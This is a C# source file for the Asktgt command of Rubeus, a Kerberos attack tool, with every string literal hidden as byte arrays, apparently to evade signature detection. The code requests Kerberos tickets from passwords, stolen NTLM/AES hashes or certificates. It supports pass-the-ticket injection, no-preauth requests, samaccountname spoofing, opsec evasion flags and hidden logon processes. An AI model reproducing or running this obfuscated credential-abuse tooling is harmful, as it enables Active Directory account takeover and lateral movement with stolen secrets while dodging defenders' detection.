using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Rubeus.lib.Interop;


namespace Rubeus.Commands
{
    public class Asktgt : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 97, 115, 107, 116, 103, 116 });

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 65, 115, 107, 32, 84, 71, 84, 13, 10 }));

            string user = S(new byte[] {});
            string domain = S(new byte[] {});
            string password = S(new byte[] {});
            string hash = S(new byte[] {});
            string dc = S(new byte[] {});
            string outfile = S(new byte[] {});
            string certificate = S(new byte[] {});
            string servicekey = S(new byte[] {});
            string principalType = S(new byte[] { 112, 114, 105, 110, 99, 105, 112, 97, 108 });
            
            bool ptt = false;
            bool opsec = false;
            bool force = false;
            bool verifyCerts = false;
            bool getCredentials = false;
            bool pac = true;
            LUID luid = new LUID();
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;
            Interop.KERB_ETYPE suppEncType = Interop.KERB_ETYPE.subkey_keymaterial;

            string proxyUrl = null;
            string service = null;
            bool nopreauth = arguments.ContainsKey(S(new byte[] { 47, 110, 111, 112, 114, 101, 97, 117, 116, 104 }));

            if (arguments.ContainsKey(S(new byte[] { 47, 117, 115, 101, 114 })))
            {
                string[] parts = arguments[S(new byte[] { 47, 117, 115, 101, 114 })].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments[S(new byte[] { 47, 117, 115, 101, 114 })];
                }
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })))
            {
                domain = arguments[S(new byte[] { 47, 100, 111, 109, 97, 105, 110 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 100, 99 })))
            {
                dc = arguments[S(new byte[] { 47, 100, 99 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }

            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey(S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 }))) {
                string encTypeString = arguments[S(new byte[] { 47, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 }))) {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 }))) {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                } else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 }))) {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                } else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 }))) {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            if (String.IsNullOrEmpty(domain))
            {
                domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;

                Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 71, 111, 116, 32, 100, 111, 109, 97, 105, 110, 58, 32 }) + domain);
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })))
            {
                password = arguments[S(new byte[] { 47, 112, 97, 115, 115, 119, 111, 114, 100 })];

                string salt = String.Format(S(new byte[] { 123, 48, 125, 123, 49, 125 }), domain.ToUpperInvariant(), user);

                // special case for computer account salts
                if (user.EndsWith(S(new byte[] { 36 })))
                {
                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpperInvariant(), user.TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());
                }

                // special case for samaccountname spoofing to support Kerberos AES Encryption
                if (arguments.ContainsKey(S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })))
                {
                    salt = String.Format(S(new byte[] { 123, 48, 125, 104, 111, 115, 116, 123, 49, 125, 46, 123, 50, 125 }), domain.ToUpperInvariant(), arguments[S(new byte[] { 47, 111, 108, 100, 115, 97, 109 })].TrimEnd('$').ToLowerInvariant(), domain.ToLowerInvariant());

                }

                if (encType != Interop.KERB_ETYPE.rc4_hmac)
                    Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 85, 115, 105, 110, 103, 32, 115, 97, 108, 116, 58, 32 }) + salt);

                hash = Crypto.KerberosPasswordHash(encType, password, salt);
            }

            else if (arguments.ContainsKey(S(new byte[] { 47, 100, 101, 115 })))
            {
                hash = arguments[S(new byte[] { 47, 100, 101, 115 })];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 114, 99, 52 })))
            {
                hash = arguments[S(new byte[] { 47, 114, 99, 52 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 110, 116, 108, 109 })))
            {
                hash = arguments[S(new byte[] { 47, 110, 116, 108, 109 })];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 49, 50, 56 })];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey(S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })))
            {
                hash = arguments[S(new byte[] { 47, 97, 101, 115, 50, 53, 54 })];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            
            if (arguments.ContainsKey(S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 }))) {
                certificate = arguments[S(new byte[] { 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101 })];

                if(arguments.ContainsKey(S(new byte[] { 47, 118, 101, 114, 105, 102, 121, 99, 104, 97, 105, 110 })) || arguments.ContainsKey(S(new byte[] { 47, 118, 101, 114, 105, 102, 121, 99, 101, 114, 116, 115 })))
                {
                    Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 86, 101, 114, 105, 102, 121, 105, 110, 103, 32, 116, 104, 101, 32, 101, 110, 116, 105, 114, 101, 32, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101, 32, 99, 104, 97, 105, 110, 33, 13, 10 }));
                    verifyCerts = true;
                }
                if (arguments.ContainsKey(S(new byte[] { 47, 103, 101, 116, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115 })))
                {
                    getCredentials = true;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101, 107, 101, 121 }))) {
                servicekey = arguments[S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101, 107, 101, 121 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
            {
                ptt = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 111, 112, 115, 101, 99 })))
            {
                opsec = true;
                if (arguments.ContainsKey(S(new byte[] { 47, 102, 111, 114, 99, 101 })))
                {
                    force = true;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 110, 111, 112, 97, 99 })))
            {
                pac = false;
            }


            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 111, 120, 121, 117, 114, 108 })))
            {
                proxyUrl = arguments[S(new byte[] { 47, 112, 114, 111, 120, 121, 117, 114, 108 })];
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101 })))
            {
                service = arguments[S(new byte[] { 47, 115, 101, 114, 118, 105, 99, 101 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
            {
                try
                {
                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                }
                catch
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40 }) + arguments[S(new byte[] { 47, 108, 117, 105, 100 })] + S(new byte[] { 41, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 117, 112, 112, 101, 110, 99, 116, 121, 112, 101 })))
            {
                string encTypeString = arguments[S(new byte[] { 47, 115, 117, 112, 112, 101, 110, 99, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 })))
                {
                    suppEncType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 })))
                {
                    suppEncType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 })))
                {
                    suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 })))
                {
                    suppEncType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }
            else
            {
                suppEncType = encType;
            }
            if (arguments.ContainsKey(S(new byte[] { 47, 112, 114, 105, 110, 99, 105, 112, 97, 108, 116, 121, 112, 101 }))) {
                principalType = arguments[S(new byte[] { 47, 112, 114, 105, 110, 99, 105, 112, 97, 108, 116, 121, 112, 101 })]; 
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })))
            {
                // if we're starting a hidden process to apply the ticket to
                if (!Helpers.IsHighIntegrity())
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 89, 111, 117, 32, 110, 101, 101, 100, 32, 116, 111, 32, 98, 101, 32, 105, 110, 32, 104, 105, 103, 104, 32, 105, 110, 116, 101, 103, 114, 105, 116, 121, 32, 116, 111, 32, 97, 112, 112, 108, 121, 32, 97, 32, 116, 105, 99, 107, 101, 116, 32, 116, 111, 32, 99, 114, 101, 97, 116, 101, 100, 32, 108, 111, 103, 111, 110, 32, 115, 101, 115, 115, 105, 111, 110 }));
                    return;
                }
                if (arguments.ContainsKey(S(new byte[] { 47, 115, 104, 111, 119 })))
                {
                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], true);
                }
                else
                {
                    luid = Helpers.CreateProcessNetOnly(arguments[S(new byte[] { 47, 99, 114, 101, 97, 116, 101, 110, 101, 116, 111, 110, 108, 121 })], false);
                }
                Console.WriteLine();
            }

            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 117, 115, 101, 114, 32, 110, 97, 109, 101, 33, 13, 10 }));
                return;
            }
            if (String.IsNullOrEmpty(hash) && String.IsNullOrEmpty(certificate) && !nopreauth)
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 112, 97, 115, 115, 119, 111, 114, 100, 44, 32, 47, 99, 101, 114, 116, 105, 102, 105, 99, 97, 116, 101, 32, 111, 114, 32, 97, 32, 91, 47, 100, 101, 115, 124, 47, 114, 99, 52, 124, 47, 97, 101, 115, 49, 50, 56, 124, 47, 97, 101, 115, 50, 53, 54, 93, 32, 104, 97, 115, 104, 33, 13, 10 }));
                return;
            }

            bool changepw = arguments.ContainsKey(S(new byte[] { 47, 99, 104, 97, 110, 103, 101, 112, 119 }));

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 79, 110, 108, 121, 32, 47, 100, 101, 115, 44, 32, 47, 114, 99, 52, 44, 32, 47, 97, 101, 115, 49, 50, 56, 44, 32, 97, 110, 100, 32, 47, 97, 101, 115, 50, 53, 54, 32, 97, 114, 101, 32, 115, 117, 112, 112, 111, 114, 116, 101, 100, 32, 97, 116, 32, 116, 104, 105, 115, 32, 116, 105, 109, 101, 46, 13, 10 }));
                return;
            }
            else
            {
                if ((opsec) && (encType != Interop.KERB_ETYPE.aes256_cts_hmac_sha1) && !(force))
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 85, 115, 105, 110, 103, 32, 47, 111, 112, 115, 101, 99, 32, 98, 117, 116, 32, 110, 111, 116, 32, 117, 115, 105, 110, 103, 32, 47, 101, 110, 99, 116, 121, 112, 101, 58, 97, 101, 115, 50, 53, 54, 44, 32, 116, 111, 32, 102, 111, 114, 99, 101, 32, 116, 104, 105, 115, 32, 98, 101, 104, 97, 118, 105, 111, 117, 114, 32, 117, 115, 101, 32, 47, 102, 111, 114, 99, 101 }));
                    return;
                }
                if (nopreauth)
                {
                    try
                    {
                        Ask.NoPreAuthTGT(user, domain, hash, encType, dc, outfile, ptt, luid, true, true, proxyUrl, service, suppEncType, opsec, principalType);
                    }
                    catch (KerberosErrorException ex)
                    {
                        KRB_ERROR error = ex.krbError;
                        try
                        {
                            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 75, 82, 66, 45, 69, 82, 82, 79, 82, 32, 40 }) + error.error_code + S(new byte[] { 41, 32, 58, 32 }) + (Interop.KERBEROS_ERROR)error.error_code + S(new byte[] { 58, 32 }) + error.e_text + S(new byte[] { 13, 10 }));
                        }
                        catch
                        {
                            Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 75, 82, 66, 45, 69, 82, 82, 79, 82, 32, 40 }) + error.error_code + S(new byte[] { 41, 32, 58, 32 }) + (Interop.KERBEROS_ERROR)error.error_code + S(new byte[] { 13, 10 }));
                        }
                    }
                }
                else if (String.IsNullOrEmpty(certificate))
                    Ask.TGT(user, domain, hash, encType, outfile, ptt, dc, luid, true, opsec, servicekey, changepw, pac, proxyUrl, service, suppEncType, principalType);
                else
                    Ask.TGT(user, domain, certificate, password, encType, outfile, ptt, dc, luid, true, verifyCerts, servicekey, getCredentials, proxyUrl, service, changepw, principalType);

                return;
            }
        }
    }
}
